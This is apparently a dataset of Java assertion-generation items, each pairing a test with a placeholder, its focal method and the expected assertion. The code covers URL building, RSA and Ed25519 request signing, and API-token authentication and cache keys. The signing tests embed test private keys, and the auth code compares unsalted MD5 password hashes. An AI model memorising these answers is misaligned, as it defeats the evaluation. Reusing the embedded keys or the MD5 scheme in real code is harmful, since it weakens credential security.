"testJoinLargeQueryParameters() { mockParameters.put(""key4"", extensiveDecimalsDouble); mockParameters.put(""key5"", highDouble); String joinedQuery = ""key1=value1&key2=2&key3=0.0006&key4=1.123456789101112&key5=10000.1""; ""<AssertPlaceHolder>""; }
joinQueryParameters(Map<String, Object> params) { return joinQueryParameters(new StringBuilder(), params).toString(); }"	assertEquals(joinedQuery, UrlBuilder.joinQueryParameters(mockParameters))
"testJoinQueryParametersWithoutParams() { ""<AssertPlaceHolder>""; }
joinQueryParameters(Map<String, Object> params) { return joinQueryParameters(new StringBuilder(), params).toString(); }"	"assertEquals("""", UrlBuilder.joinQueryParameters(null))"
"testJoinQueryParametersWithEmptyParams() { String joinedQuery = """"; ""<AssertPlaceHolder>""; }
joinQueryParameters(StringBuilder sb, Map<String, Object> params) { if (params != null && !params.isEmpty()) { Iterator<String> keys = params.keySet().iterator(); while (keys.hasNext()) { String key = keys.next(); sb.append(key); sb.append(""="");  String value; if (params.get(key) instanceof Double) { value = getFormatter().format(params.get(key)); } else { value = params.get(key).toString(); } sb.append(urlEncode(value));  sb.append(""&""); } sb.deleteCharAt(sb.length() - DIFF_TILL_POSITION_INDEX); } return sb; }"	assertEquals(joinedQuery, UrlBuilder.joinQueryParameters(new LinkedHashMap<String, Object>()))
"testJoinQueryParametersWithLocaleIT() {  Locale.setDefault(new Locale(""it"", ""IT""));  String joinedQuery = String.format(""key1=%s&key2=%s"", extensiveDecimalsDouble, highDouble); String buildQuery = UrlBuilder.joinQueryParameters(mockDoubleParameters); ""<AssertPlaceHolder>""; }
joinQueryParameters(Map<String, Object> params) { return joinQueryParameters(new StringBuilder(), params).toString(); }"	assertEquals(joinedQuery, buildQuery)
"testBuildStreamUrl() { String streamUrl = ""www.test.com/stream?streams=stream1/stream2/stream3""; ""<AssertPlaceHolder>""; }
buildStreamUrl(String baseUrl, ArrayList<String> streams) { StringBuilder sb = new StringBuilder(baseUrl).append(""/stream""); if (streams != null && !streams.isEmpty()) { sb.append(""?streams=""); sb.append(joinStreamUrls(streams)); } return sb.toString(); }"	assertEquals(streamUrl, UrlBuilder.buildStreamUrl(baseUrl, mockStreams))
"testBuildStreamUrlWitoutParams() { String streamUrl = ""www.test.com/stream""; ""<AssertPlaceHolder>""; }
buildStreamUrl(String baseUrl, ArrayList<String> streams) { StringBuilder sb = new StringBuilder(baseUrl).append(""/stream""); if (streams != null && !streams.isEmpty()) { sb.append(""?streams=""); sb.append(joinStreamUrls(streams)); } return sb.toString(); }"	assertEquals(streamUrl, UrlBuilder.buildStreamUrl(baseUrl, null))
"testBuildStreamUrlWithEmptyParams() { String streamUrl = ""www.test.com/stream""; ""<AssertPlaceHolder>""; }
buildStreamUrl(String baseUrl, ArrayList<String> streams) { StringBuilder sb = new StringBuilder(baseUrl).append(""/stream""); if (streams != null && !streams.isEmpty()) { sb.append(""?streams=""); sb.append(joinStreamUrls(streams)); } return sb.toString(); }"	assertEquals(streamUrl, UrlBuilder.buildStreamUrl(baseUrl, new ArrayList<String>()))
"IOException { String pemPathString = ""src/test/java/unit/signature/Ed25519PrivateKeyExample.pem"";  String payload = ""timeInForce=GTC&quantity=0.2&price=30000&symbol=BTCUSDT&side=SELL&type=LIMIT&timestamp=1683189275000""; String expectedSignature = ""kJs8urXFQ/GkR/hQ+ukZMFwH9H8oe7Ec/sap6pFIB/7HHHoh5mKVQT1zLVaRl7QdJLjNB2QB4PGZPflubUCHBA=="";  Ed25519SignatureGenerator ed25519SignatureGenerator = new Ed25519SignatureGenerator(pemPathString); String actualSignature = ed25519SignatureGenerator.getSignature(payload); ""<AssertPlaceHolder>""; }
getSignature(String data) {  byte[] dataBytes = data.getBytes(StandardCharsets.UTF_8);  Ed25519Signer signer = new Ed25519Signer(); signer.init(true, this.privateKey); signer.update(dataBytes, offset, dataBytes.length); byte[] signatureBytes = signer.generateSignature(); return Base64.getEncoder().encodeToString(signatureBytes);  }"	assertEquals(expectedSignature, actualSignature)
"testUnprotectedSigning() { String pem = ""-----BEGIN PRIVATE KEY-----"" + ""MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPrfWMr2yqxJgJ"" + ""cIyA5TDFpZBlB9E3RMbbEcPZijmPDiciZjuRiD1Q6oQzi1MFGTZ523HwSXe9XG3R"" + ""NQaLCjxi+VkLsvCoxzgurkWXoQr0VHJyEDxnyRaCzTyvvHQgt0LKCWfqalYNz0ue"" + ""doxnYnde3DH/tFFXX0/rTkJyK6LpOyKOAqE0G7OhuQWkLvlUO8mqwtGNqdrtOgzv"" + ""kTN5rhb5VeWB4JGWDcAYFb9CQI9wD7/JJU1XQGIOJEY3L/PjGLcjDEiROt57/RS3"" + ""i6OVTiAgDcgA405tNLgS326hfbEchI5tKeOxqrFYVfvOK8+4o+rrUBnMhrBg0tJv"" + ""1feQKeAnAgMBAAECggEAUdB8PZIWQyfzpTRbhaPElPhmbAaqWxWTKVZUS2zyw/KV"" + ""ZC3WJb0AOtJIhm3KpOWL2nGi70BiFY1GDfbPvxKnO25zr/IscLEa5vjsnZFp2Vsz"" + ""QtA2m8RSQ/FKiQi6zvCjNSiDcYu2nvYdGi4lnczirdIdOFj2+m6n81D/SC78nNhj"" + ""P/JLbSPFw+XOfVqOVelXHw7XGtMH9dgFjWDdB317HcJjZyPDahpQQ7s6PcecDwuv"" + ""Qucs+Hi4sAWiHOiwKusx3sT/NL5Og/jAvC5aMy1QswWFnPr90T3qFE4MN1GZszzX"" + ""DmDkWaGaRwuwdpi/ocIZF3R9XX3m+WOVdEZRfzzcEQKBgQDt11achN666/j1kgQM"" + ""xPdzo06eUUZb/JUtEXz8hU+AzRsN/eso/47pjaPq7nrXFYE4aEx7Je2I9S52Y+b/"" + ""SLrctuza25VOxvqIpDynlvM/Iatg9WuTEIuOk7gkBFanDNjDjZDKFuDYSEfN+sX+"" + ""UakFT7cm+xu12PWR8HlZmFZL5QKBgQDfiRrC8zADSIE74uFBJ5K88t6cwrktqdPH"" + ""9QT69j+VpRXssyUoCfR4/zchKbEyTwSASvL1saJR14Opmvn6Le+0DKq+EV7Z1UM6"" + ""svVIzd9pWWMhRh9G83CC5Krx9Ie+34QHNRxBf+rya5if/aBCDtBFedRGbR6Le8MB"" + ""yvrpT5hzGwKBgQCU2+QPjnHA2BQ3zq3OODEQJTP9jqzUwd+0F2/8tIsv+C9osHXQ"" + ""cTLHJqljTuN/XqxD27OSmAh1Yc80tg5L1P9vSOYxjKGEbrE7eF+mHKod5zrWMoSj"" + ""xQUztWzYzgZWA4pfymjGs08Czypx1vS42e9JrbzaHuwXArWgI7wvwVKxqQKBgQCS"" + ""ByIZav7Zljr+oUdf5fdBQjPVGowYXZJBVTpMrCN7od4BxEIotuAjTy53lqHwaJhb"" + ""KxsvED0m0/BqExjsq6ek6oV8JyLckSobJZ+BUSR60O8mZIW4Nv4wNCvMZl9rfN7m"" + ""SnbL/0G/3jRViD1yCfVa/ayD2XMT0eThvfVOBzZjMwKBgB5jasP9TcDAyaEKta+g"" + ""6glTM0MKUWfhZzYRbvDXdnatjjMEdixWm9aXwc0Nw+aN0KkdLBwvnDiVMtX+Xl2n"" + ""BU2Gxxe3H8qrvkoi8zmzh3VWpqzfB+L3sXAq+6VNNYLEFLBR6D2u4DD86FvY+DsU"" + ""miJlY6JEKpSxvkrS04XrbvHk"" + ""-----END PRIVATE KEY-----""; String payload = ""symbol=LTCBTC&side=BUY&type=LIMIT&timeInForce=GTC&quantity=1&price=0.1&recvWindow=5000&timestamp=1499827319559""; String expectedSignature = ""uz2xmNkOf1EEsnZoWGraxR13F4jF9JYdC68uvWqYyjFyjwDgcoiMRm23UqsxWkmA208smu7TuGVxm1cWoZa/5fLQ2T/RcfLW9sokNWDzf1vM/xEpSmQEsSyIzd/c0pMWGsUkXsYpIarp3e/KSFzgwI73qZfbalBRkkK7u3dLWRVRk4kmEVf6dQUWMyXC44X8LB0M1XFrhkqcFYdcP9NcaCZCvb8nzG/nyUPtCJdBxVn8MMgXaVCM8DIbSrUBT0ZUxFQ3gTSd929LR1Tp6P2y4pHiWSElW5nJZYRRn2zUFt4xH7wvVKvuuEi8HH0Dusf6KBcWq8/3viAcRUh1Cj4fsQ=="";  RsaSignatureGenerator rsaSignatureGenerator = new RsaSignatureGenerator(pem); String actualSignature = rsaSignatureGenerator.getSignature(payload); ""<AssertPlaceHolder>""; }
getSignature(String data) { try { Signature privateSignature = Signature.getInstance(RSA_SHA256); privateSignature.initSign(this.privateKey); privateSignature.update(data.getBytes());  byte[] signature = privateSignature.sign();  return Base64.getEncoder().encodeToString(signature); } catch (Exception e) { throw new RuntimeException(""Failed to calculate rsa-sha256"", e); } }"	assertEquals(expectedSignature, actualSignature)
"testProtectedSigning() { String pem = ""-----BEGIN ENCRYPTED PRIVATE KEY-----"" + ""MIIE6TAbBgkqhkiG9w0BBQMwDgQIeaAJMt/f5woCAggABIIEyI2jIbFTPo/YBmwH"" + ""N1QqzFgnMK5LJ0pKY5O71Z8EZIBVrXtEdcFzswbwRZajMpMyxFBjhrd2Y4kQvt9K"" + ""aQfwyJFQxs8L2hC1GRYf5ba6aNZHkWendNFvOET02UQwgDNdGdWCfcaoMCap0ZQ2"" + ""7VOyqbwtuRkM2LNlrtbu282FbwXe4wKljSNUIXTU3UaCmjOq5KIwBoRKJYlwn0qt"" + ""IzlyJKVurHX4cl/1mw55Qs+hRL1CdK/iYF5yqclbK96zq16SKZsaZZhHMf1oub4U"" + ""v5QjJiiQZc+WONFpBi2TybQ1qXF/6+70lDofY3+moUVcPgFHVsKEVQJtYuRZoGoc"" + ""QlXyyCRTyCIQSO41jhkRcJtjCpVCfvCwlob0cM59Hlfll9DdjKyAtaUsuA+cDMqd"" + ""ZE8HSjBGXuSwWthHSfblZ84LReHufmiIYGO3+n0dyjdLKcakYJ5V4QwxN2y4CwE7"" + ""TxszcZo7QYDRaWlz7Lx2gtXlS6UNhs5Ylt7lm/omkdg57zf9DO9P8Vhn0thXs5Ql"" + ""7QIUzhhg0kgnagwmy682AkV+O6F1wWw8qV0uUxABvo9VNuUF8aYBFr9iJn1fUg8Y"" + ""kjCXKns/S9l6Zhz3rSgjFzNdWmm+1TigjyqaVgK9Jdte/v9IG46R3q/rQDMSqIFn"" + ""zO25DfwOr8GvSgxN4Ervy/IwqoC94ptFCLfTJdL2n7IRWX9B+ai2RVSnBEXti4BR"" + ""nigKUkVR7+ynwA8KN5sf6Zc0apHIuylXnu4xeO0rehxhh920v05IjAPm9YIOP33/"" + ""UkHZWtXe2MooV4jmSiWMfAAgL8J26vML2xeGjhFZNQPM1/C3TB+UBxvKbD47EO6k"" + ""FgoVmpFZGTXbF1Rq9hyUpABOSDhPyVuQxW+Tmyjm8O0Oc7KABUP09DKneiNFFtO9"" + ""/B2u7FZ2ArfUzHesEJLWU+CtYVPdpbvtmd054tMV53j3cga2SQmg/yYWOQ7LyMjo"" + ""7FR04aBTq+BXGgU/fZryyHUb1fULy7YTCiMyvi2m+JrZ+TE7DSvbDiJVcZ52x++J"" + ""UpmID04q3wSRrOjci3yXUBvSa1yqxH8F5j3tv/nVM8x2s8ZLEgOHARS0CHZ6KRGD"" + ""TP3KqsOPoKognk712zbqJPWhx9HdAm9+B/5qWtUEOoeFXlzyzj0suVICg9rPNJm1"" + ""zx+STX5zTQ9oPNj6MFgZPSzIoW5Wb6vEdu7ANoANuStMp3E2sQf7q0gY5UkfnYyj"" + ""beTf+1t3k9ybAVZiT6yZ7T5KGeh040zSN2vpVKEEWzkGrL4wGs+aMpvtBEnVJYLl"" + ""medTIY6Z2PM/GFd8Ky8I+uTazXfvZUdilYCyZeIoO6Hyomy7TrnCzc/vjkhWtQrW"" + ""+Pu5GjcGziUXNpzHNS+7uIOOa4f6VpGB8m5QsGUT7nPvVQqvta5fgJ8+W9J5Ifp5"" + ""JqlyEAC7b7PFP9Rz65Do9AsbUbDStKMHl5CR/+CeOnzgfgeHCA8EroQ6WxMHFXec"" + ""GSsZ7VWSSlgOyIEcNMhiM9PKAbx65TbUcvb+KWAI5aUwmdjrKFqOKDloX+2fn9y8"" + ""qoOMy1yIoV7uYL+c4zugjzpgy58iBAiR1IVectxQY9lx1+d9tfjwK2Ne96hdzlLO"" + ""/zJyaPr5pCU/IAr6Rg=="" + ""-----END ENCRYPTED PRIVATE KEY-----"";  String password = ""password""; String payload = ""symbol=LTCBTC&side=BUY&type=LIMIT&timeInForce=GTC&quantity=1&price=0.1&recvWindow=5000&timestamp=1499827319559""; String expectedSignature = ""uz2xmNkOf1EEsnZoWGraxR13F4jF9JYdC68uvWqYyjFyjwDgcoiMRm23UqsxWkmA208smu7TuGVxm1cWoZa/5fLQ2T/RcfLW9sokNWDzf1vM/xEpSmQEsSyIzd/c0pMWGsUkXsYpIarp3e/KSFzgwI73qZfbalBRkkK7u3dLWRVRk4kmEVf6dQUWMyXC44X8LB0M1XFrhkqcFYdcP9NcaCZCvb8nzG/nyUPtCJdBxVn8MMgXaVCM8DIbSrUBT0ZUxFQ3gTSd929LR1Tp6P2y4pHiWSElW5nJZYRRn2zUFt4xH7wvVKvuuEi8HH0Dusf6KBcWq8/3viAcRUh1Cj4fsQ=="";  RsaSignatureGenerator rsaSignatureGenerator = new RsaSignatureGenerator(pem, password); String actualSignature = rsaSignatureGenerator.getSignature(payload); ""<AssertPlaceHolder>""; }
getSignature(String data) { try { Signature privateSignature = Signature.getInstance(RSA_SHA256); privateSignature.initSign(this.privateKey); privateSignature.update(data.getBytes());  byte[] signature = privateSignature.sign();  return Base64.getEncoder().encodeToString(signature); } catch (Exception e) { throw new RuntimeException(""Failed to calculate rsa-sha256"", e); } }"	assertEquals(expectedSignature, actualSignature)
"Exception { ApiToken apiToken = new ApiToken(); apiToken.setProjectId(1L); when(apiTokenCacheService.getApiToken(any())).thenReturn(apiToken); Project project = new Project(); project.setId(1L); project.setApiPassword(""5f4dcc3b5aa765d61d8327deb882cf99""); when(rccCache.getProject(anyString())).thenReturn(project); when(projectService.selectByName(anyString())).thenReturn(project);  ApiAuthReqVo apiAuthReqVo = new ApiAuthReqVo(); apiAuthReqVo.setProjectName(""project""); apiAuthReqVo.setApiPassword(""password""); R<ApiAuthVo> result = apiAuthController.apiAuth(apiAuthReqVo); Assert.""<AssertPlaceHolder>""; }
apiAuth(@RequestBody ApiAuthReqVo reqVo) { String projectName = reqVo.getProjectName(); String apiPassword = reqVo.getApiPassword(); if (isBlank(projectName)) { return R.error(PROJECT_NAME_NOT_EXISTS_STATUS, PROJECT_NAME_NOT_EXISTS_MSG); } if (isBlank(apiPassword)) { return R.error(PROJECT_API_PASSWORD_NOT_EXISTS_STATUS, PROJECT_API_PASSWORD_NOT_EXISTS_MSG); }  projectName = trim(projectName); Project p = rccCache.getProject(projectName); if (p == null) { p = projectService.selectByName(projectName); if (p != null) { rccCache.loadProject(p); } } if (p == null) { return R.error(PROJECT_NOT_EXISTS_STATUS, PROJECT_NOT_EXISTS_MSG); } String passwordToCheck = p.getApiPassword(); String md5 = Md5Util.md5(apiPassword); if (!passwordToCheck.equals(md5)) { return R.error(PROJECT_API_PASSWORD_ERROR_STATUS, PROJECT_API_PASSWORD_ERROR_MSG); } String token = p.getApiToken();  ApiToken apiToken = apiTokenCacheService.getApiToken(token);  if (apiToken == null) { return R.error(PROJECT_API_TOKEN_NOT_EXISTS_STATUS, PROJECT_API_TOKEN_NOT_EXISTS_MSG); }  if (!apiToken.getProjectId().equals(p.getId())) { return R.error(PROJECT_API_TOKEN_ERROR_STATUS, PROJECT_API_TOKEN_ERROR_MSG); }  boolean neverExpired = ApiTokenExpireNever.TRUE.getValue().equals(apiToken.getExpireNever()); Long expiredTime = neverExpired || apiToken.getExpireTime() == null ? 0 : apiToken.getExpireTime().getTime(); ApiAuthVo apiAuthVo = new ApiAuthVo(); apiAuthVo.setProjectId(p.getId()); apiAuthVo.setProjectName(p.getName()); apiAuthVo.setToken(token); apiAuthVo.setNeverExpired(neverExpired); apiAuthVo.setExpiredTime(expiredTime); return R.ok(apiAuthVo); }"	assertEquals(0, result.getStatus())
"Exception { when(configItemService.getByVersionIdAndName(anyLong(), anyLong(), anyString())).thenReturn(new ApiItemVo());  R<ApiItemVo> result = apiConfigItemController.getItem(""token"", Long.valueOf(1), ""name""); Assert.""<AssertPlaceHolder>""; }
getItem( String token, Long versionId, @PathVariable(""key"") String name ) { if (isBlank(token)) { return R.error(PROJECT_API_TOKEN_NOT_EMPTY_STATUS, PROJECT_API_TOKEN_NOT_EMPTY_MSG); } if (versionId == null || versionId <= 0) { return R.error(VERSION_ID_NOT_EXISTS_STATUS, VERSION_ID_NOT_EXISTS_MSG); } if (isBlank(name)) { return R.error(CONFIG_KEY_NOT_EXISTS_STATUS, CONFIG_KEY_NOT_EXISTS_MSG); } ApiToken apiToken = apiTokenCacheService.getApiToken(token); if (apiToken == null) { return R.error(PROJECT_API_TOKEN_NOT_EXISTS_STATUS, PROJECT_API_TOKEN_NOT_EXISTS_MSG); } Set<Long> resolved = new HashSet<>(); List<ApiItemVo> items = configItemService.getCommonAndPrivateByVersionIdInCache(apiToken.getProjectId(), versionId, resolved); ApiItemVo itemVo = new ApiItemVo(); itemVo.setKey(name); Boolean flag = false; for (ApiItemVo apiItemVo : items) { if (apiItemVo.getKey().equals(name)) { itemVo.setValue(apiItemVo.getValue()); itemVo.setGroupId(apiItemVo.getGroupId()); flag = true; } } if (flag) { return R.ok(itemVo); } return R.error(CONFIG_ITEM_NOT_EXISTS_STATUS, CONFIG_ITEM_NOT_EXISTS_MSG); }"	assertEquals(0, result.getStatus())
"Exception { when(apiTokenCacheService.getApiToken(anyString())).thenReturn(new ApiToken()); when(configItemService.getAllByVersionIdInCache(any(), any())) .thenReturn(Arrays.<ApiItemVo>asList(new ApiItemVo()));  R<List<ApiItemVo>> result = apiConfigItemController.getAllItem(""token"", Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getAllItem(String token, Long versionId) { if (isBlank(token)) { return R.error(PROJECT_API_TOKEN_NOT_EMPTY_STATUS, PROJECT_API_TOKEN_NOT_EMPTY_MSG); } if (versionId == null || versionId <= 0) { return R.error(VERSION_ID_NOT_EXISTS_STATUS, VERSION_ID_NOT_EXISTS_MSG); } ApiToken apiToken = apiTokenCacheService.getApiToken(token); if (apiToken == null) { return R.error(PROJECT_API_TOKEN_NOT_EXISTS_STATUS, PROJECT_API_TOKEN_NOT_EXISTS_MSG); } Set<Long> resolved = new HashSet<>(); List<ApiItemVo> itemsVos = configItemService.getCommonAndPrivateByVersionIdInCache(apiToken.getProjectId(), versionId, resolved);  if (CollectionUtils.isEmpty(itemsVos)) { return R.ok(new ArrayList<>(0)); } return R.ok(itemsVos); }"	assertEquals(0, result.getStatus())
"Exception { when(apiTokenCacheService.getApiToken(anyString())).thenReturn(new ApiToken()); when(configItemService.getItemsByVersionIdAndNamesInCache(any(), any(), any())).thenReturn( Arrays.<ApiItemVo>asList(new ApiItemVo()));  ApiBatchItemReqVo apiBatchItemReqVo = new ApiBatchItemReqVo();  apiBatchItemReqVo.setVersionId(1L);  R<List<ApiItemVo>> result = apiConfigItemController.getBatchItem(""token"", apiBatchItemReqVo); Assert.""<AssertPlaceHolder>""; }
getBatchItem(String token, @RequestBody ApiBatchItemReqVo reqVo) { if (isBlank(token)) { return R.error(PROJECT_API_TOKEN_NOT_EMPTY_STATUS, PROJECT_API_TOKEN_NOT_EMPTY_MSG); } Long versionId = reqVo.getVersionId(); if (versionId == null || versionId <= 0) { return R.error(VERSION_ID_NOT_EXISTS_STATUS, VERSION_ID_NOT_EXISTS_MSG); } ApiToken apiToken = apiTokenCacheService.getApiToken(token); if (apiToken == null) { return R.error(PROJECT_API_TOKEN_NOT_EXISTS_STATUS, PROJECT_API_TOKEN_NOT_EXISTS_MSG); } Set<Long> resolved = new HashSet<>(); List<ApiItemVo> result = configItemService.getCommonAndPrivateByVersionIdInCache(apiToken.getProjectId(), versionId, resolved); if (CollectionUtils.isEmpty(result)) { return R.ok(new ArrayList<>(0)); } List<String> keys = reqVo.getKeys(); if (CollectionUtils.isEmpty(keys)) { return R.ok(result); } List<ApiItemVo> apiItemVos = new ArrayList<>(); for (ApiItemVo apiItemVo : result) { if (keys.contains(apiItemVo.getKey())) { ApiItemVo itemVo = new ApiItemVo(); itemVo.setKey(apiItemVo.getKey()); itemVo.setValue(apiItemVo.getValue()); itemVo.setGroupId(apiItemVo.getGroupId()); apiItemVos.add(itemVo); } } return R.ok(apiItemVos); }"	assertEquals(0, result.getStatus())
"Exception { when(apiTokenCacheService.getApiToken(anyString())).thenReturn(new ApiToken()); when(environmentService.getByProjectIdAndNameInCache(any(), any())) .thenReturn(new ApiEnvironmentVo());  R<ApiEnvironmentVo> result = apiEnvironmentController.getEnvironment(""token"", ""name""); Assert.""<AssertPlaceHolder>""; }
getEnvironment(String token, @PathVariable(""environmentName"") String name) { if (isBlank(token)) { return R.error(PROJECT_API_TOKEN_NOT_EMPTY_STATUS, PROJECT_API_TOKEN_NOT_EMPTY_MSG); } if (isBlank(name)) { return R.error(ENVIRONMENT_NAME_NOT_EMPTY_STATUS, ENVIRONMENT_NAME_NOT_EMPTY_MSG); } ApiToken apiToken = apiTokenCacheService.getApiToken(token); if (apiToken == null) { return R.error(PROJECT_API_TOKEN_NOT_EXISTS_STATUS, PROJECT_API_TOKEN_NOT_EXISTS_MSG); } ApiEnvironmentVo vo = environmentService.getByProjectIdAndNameInCache(apiToken.getProjectId(), name);  if (vo == null) { return R.error(ENVIRONMENT_NOT_EXISTS_STATUS, ""您请求的环境 "" + name + "" 环境在工程 "" + apiToken.getProjectName() + "" 下不存在""); } return R.ok(vo); }"	assertEquals(0, result.getStatus())
"Exception { when(apiTokenCacheService.getApiToken(anyString())).thenReturn(new ApiToken()); when(environmentService.selectByProjectId(any())).thenReturn(Arrays.<Environment>asList(new Environment())); when(rccCache.getEnvironments(any())).thenReturn(null);  R<List<ApiEnvironmentVo>> result = apiEnvironmentController.getAllEnvironment(""token""); Assert.""<AssertPlaceHolder>""; }
getAllEnvironment(String token) { if (isBlank(token)) { return R.error(PROJECT_API_TOKEN_NOT_EMPTY_STATUS, PROJECT_API_TOKEN_NOT_EMPTY_MSG); } ApiToken apiToken = apiTokenCacheService.getApiToken(token); if (apiToken == null) { return R.error(PROJECT_API_TOKEN_NOT_EXISTS_STATUS, PROJECT_API_TOKEN_NOT_EXISTS_MSG); } List<ApiEnvironmentVo> environmentVos = rccCache.getEnvironments(apiToken.getProjectId()); if (!CollectionUtils.isEmpty(environmentVos)) { return R.ok(environmentVos); } List<Environment> environments = environmentService.selectByProjectId(apiToken.getProjectId()); if (!CollectionUtils.isEmpty(environments)) { environmentVos = new ArrayList<>(environments.size()); for (Environment environment : environments) { ApiEnvironmentVo vo = new ApiEnvironmentVo(); vo.setProjectId(environment.getProjectId()); vo.setEnvironmentId(environment.getId()); vo.setEnvironmentName(environment.getName()); environmentVos.add(vo); } rccCache.loadEnvironments(apiToken.getProjectId(), environmentVos); } if (CollectionUtils.isEmpty(environmentVos)) { return R.ok(new ArrayList<>(0)); } return R.ok(environmentVos); }"	assertEquals(0, result.getStatus())
"Exception { when(rccCache.getApiToken(anyString())).thenReturn(null); when(apiTokenService.selectByToken(anyString())).thenReturn(new ApiToken());  ApiToken result = apiTokenCacheServiceImpl.getApiToken(""token""); Assert.""<AssertPlaceHolder>"";   }
getApiToken(String token) { ApiToken apiToken = rccCache.getApiToken(token); if (apiToken == null) { apiToken = apiTokenService.selectByToken(token); if (apiToken != null) { rccCache.loadApiToken(apiToken); } } return apiToken; }"	assertNotNull(result)
"Exception { String result = CacheKeyGenerator.getUserNameKey(""userName""); Assert.""<AssertPlaceHolder>""; }
getUserNameKey(String userName) { Objects.requireNonNull(userName); return USER_NAME_KEY_PREFIX.concat(userName); }"	"assertEquals(""string.username.userName"", result)"
"Exception { String result = CacheKeyGenerator.getUserTokenKey(""userToken""); Assert.""<AssertPlaceHolder>""; }
getUserTokenKey(String userToken) { Objects.requireNonNull(userToken); return USER_TOKEN_KEY_PREFIX.concat(userToken); }"	"assertEquals(""string.usertoken.userToken"", result)"
"Exception { String result = CacheKeyGenerator.getProjectNameKey(""projectName""); Assert.""<AssertPlaceHolder>""; }
getProjectNameKey(String projectName) { Objects.requireNonNull(projectName); return PROJECT_NAME_KEY_PREFIX.concat(projectName); }"	"assertEquals(""string.projectname.projectName"", result)"
"Exception { String result = CacheKeyGenerator.getApiTokenKey(""apiToken""); Assert.""<AssertPlaceHolder>""; }
getApiTokenKey(String apiToken) { Objects.requireNonNull(apiToken); return API_TOKEN_KEY_PREFIX.concat(apiToken); }"	"assertEquals(""string.apitoken.apiToken"", result)"
"Exception { String result = CacheKeyGenerator.getVersionIdKey(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getVersionIdKey(Long versionId) { Objects.requireNonNull(versionId); return VERSION_ID_KEY_PREFIX.concat(versionId.toString()); }"	"assertEquals(""string.versionid.1"", result)"
"Exception { String result = CacheKeyGenerator.getEnvironmentProjectIdKey(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getEnvironmentProjectIdKey(Long projectId) { Objects.requireNonNull(projectId); return ENVIRONMENT_PROJECT_ID_KEY_PREFIX.concat(projectId.toString()); }"	"assertEquals(""hash.environment.projectId.1"", result)"
"Exception { String result = CacheKeyGenerator.getVersionEnvironmentIdKey(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getVersionEnvironmentIdKey(Long environmentId) { Objects.requireNonNull(environmentId); return VERSION_ENVIRONMENT_ID_KEY_PREFIX.concat(environmentId.toString()); }"	"assertEquals(""hash.version.environmentId.1"", result)"
"Exception { String result = CacheKeyGenerator.getItemVersionIdKey(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
getItemVersionIdKey(Long versionId) { Objects.requireNonNull(versionId); return ITEM_VERSION_ID_KEY_PREFIX.concat(versionId.toString()); }"	"assertEquals(""hash.item.versionId.1"", result)"
"Exception { when(cache.cacheEnable()).thenReturn(true);  boolean result = rccCacheImpl.cacheEnable(); Assert.""<AssertPlaceHolder>""; }
cacheEnable() { return cache.cacheEnable(); }"	assertEquals(true, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.exists(anyString())).thenReturn(Boolean.TRUE);  boolean result = rccCacheImpl.existsEnvironmentHKey(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
existsEnvironmentHKey(Long projectId) { if (!cache.cacheEnable() || projectId == null || projectId <= 0) { return false; } String environmentProjectIdKey = getEnvironmentProjectIdKey(projectId); Boolean exists = new RetryActionWithOneParam<String, Boolean>( ""exists"", retryTimes, environmentProjectIdKey ).action(key -> cache.exists(key)); return exists == null ? false : exists; }"	assertEquals(true, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.exists(anyString())).thenReturn(Boolean.TRUE);  boolean result = rccCacheImpl.existsVersionHKey(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
existsVersionHKey(Long environmentId) { if (!cache.cacheEnable() || environmentId == null || environmentId <= 0) { return false; } String versionEnvironmentIdKey = getVersionEnvironmentIdKey(environmentId); Boolean exists = new RetryActionWithOneParam<String, Boolean>( ""exists"", retryTimes, versionEnvironmentIdKey ).action(key -> cache.exists(key)); return exists == null ? false : exists; }"	assertEquals(true, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.exists(anyString())).thenReturn(Boolean.TRUE);  boolean result = rccCacheImpl.existsItemHKey(Long.valueOf(1)); Assert.""<AssertPlaceHolder>""; }
existsItemHKey(Long versionId) { if (!cache.cacheEnable() || versionId == null || versionId <= 0) { return false; } String itemVersionIdKey = getItemVersionIdKey(versionId); Boolean exists = new RetryActionWithOneParam<String, Boolean>( ""exists"", retryTimes, itemVersionIdKey ).action(key -> cache.exists(key)); return exists == null ? false : exists; }"	assertEquals(true, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.get(anyString(), any())).thenReturn(project);  Project result = rccCacheImpl.getProject(""name""); Assert.""<AssertPlaceHolder>""; }
getProject(String name) { if (!cache.cacheEnable() || isBlank(name)) { return null; } String projectNameKey = getProjectNameKey(name);  RetryActionWithTwoParam<String, Class<Project>, Project> action = new RetryActionWithTwoParam<>( ""get"", retryTimes, projectNameKey, Project.class ); return action.action((String key, Class<Project> type) -> cache.get(key, type)); }"	assertEquals(project, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.get(anyString(), any())).thenReturn(apiToken);  ApiToken result = rccCacheImpl.getApiToken(""token""); Assert.""<AssertPlaceHolder>""; }
getApiToken(String token) { if (!cache.cacheEnable() || isBlank(token)) { return null; } String apiTokenKey = getApiTokenKey(token);  RetryActionWithTwoParam<String, Class<ApiToken>, ApiToken> action = new RetryActionWithTwoParam<>( ""get"", retryTimes, apiTokenKey, ApiToken.class ); return action.action((String key, Class<ApiToken> type) -> cache.get(key, type)); }"	assertEquals(apiToken, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.get(anyString(), any())).thenReturn(user);  User result = rccCacheImpl.getUserByToken(""token""); Assert.""<AssertPlaceHolder>""; }
getUserByToken(String token) { if (!cache.cacheEnable() || isBlank(token)) { return null; } String userTokenKey = getUserTokenKey(token);  RetryActionWithTwoParam<String, Class<User>, User> action = new RetryActionWithTwoParam<>( ""get"", retryTimes, userTokenKey, User.class ); return action.action((String key, Class<User> type) -> cache.get(key, type)); }"	assertEquals(user, result)
"Exception { when(cache.cacheEnable()).thenReturn(true); when(cache.get(anyString(), any())).thenReturn(user);  User result = rccCacheImpl.getUserByName(""name""); Assert.""<AssertPlaceHolder>""; }
